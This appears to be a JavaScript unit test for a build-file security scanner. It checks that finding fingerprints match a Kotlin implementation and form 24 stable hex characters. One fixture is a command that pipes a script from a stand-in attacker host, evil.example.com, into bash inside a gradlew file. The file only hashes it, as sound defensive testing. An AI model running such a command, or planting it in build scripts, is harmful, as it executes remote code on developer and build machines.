const test = require('node:test');
const assert = require('node:assert');
const { findingFingerprint } = require('../dist/scanner/fingerprints.js');

test('fingerprint matches the Kotlin scanner byte-for-byte', () => {
  // Known-good value produced by the Kotlin Fingerprints.finding for this exact input.
  assert.strictEqual(
    findingFingerprint('WG-BUILD-003', 'build.gradle', 'maven { url "https://plugins.example.com/maven"'),
    '63f2f5217c117f771fe57705'
  );
});

test('fingerprint is 24 hex chars and stable', () => {
  const a = findingFingerprint('WG-SCRIPT-001', 'gradlew', 'curl -fsSL https://evil.example.com/x.sh | bash');
  const b = findingFingerprint('WG-SCRIPT-001', 'gradlew', 'curl -fsSL https://evil.example.com/x.sh | bash');
  assert.strictEqual(a, b);
  assert.match(a, /^[0-9a-f]{24}$/);
});
